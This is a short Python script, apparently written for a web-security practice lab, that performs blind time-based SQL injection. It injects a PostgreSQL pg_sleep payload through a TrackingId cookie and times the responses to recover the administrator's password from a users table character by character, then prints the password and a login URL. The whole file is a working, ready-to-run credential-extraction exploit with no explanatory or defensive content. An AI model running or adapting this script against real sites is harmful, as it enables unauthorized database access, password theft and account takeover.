import requests
import string
import time

TARGET_URL = "https://exemple.com"
CHARS = string.ascii_lowercase + string.digits
PASSWORD_LENGTH = 20
DELAY = 8  # seconds threshold to confirm TRUE

def check_char(position, char, session):
    payload = (
        f"x'%3BSELECT+CASE+WHEN+"
        f"(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')"
        f"+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
    )
    cookies = {"TrackingId": payload, "session": "PASTE_FRESH_SESSION_HERE"}
    
    start = time.time()
    try:
        r = session.get(TARGET_URL, cookies=cookies, timeout=20)
    except requests.exceptions.Timeout:
        return True  # timeout = definitely delayed
    elapsed = time.time() - start
    
    return elapsed >= DELAY

def extract_password():
    session = requests.Session()
    password = ""
    
    for pos in range(1, PASSWORD_LENGTH + 1):
        print(f"[*] Cracking position {pos}...", end=" ", flush=True)
        for char in CHARS:
            if check_char(pos, char, session):
                password += char
                print(f"Found: '{char}' → password so far: {password}")
                break
        else:
            print("?? No match found at this position!")
    
    return password

if __name__ == "__main__":
    print("[*] Starting blind time-based SQLi extraction...")
    password = extract_password()
    print(f"\n[+] Administrator password: {password}")
    print(f"[+] Login at: {TARGET_URL}login")